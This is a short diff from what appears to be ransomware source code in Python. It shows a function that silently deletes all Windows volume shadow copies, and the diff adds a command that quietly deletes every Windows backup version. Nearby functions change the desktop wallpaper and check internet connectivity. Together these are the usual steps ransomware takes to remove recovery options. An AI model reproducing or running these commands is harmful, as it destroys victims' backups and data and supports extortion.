@@ -301,6 +301,7 @@ def change_wallpaper():
 
 def delete_shadow_copy():
     execute_command("vssadmin delete shadows /all /quiet")
+    execute_command("wbadmin delete backup -keepVersions:0 -quiet")
 
 
 def check_connection(url="http://www.google.com/", timeout=30):
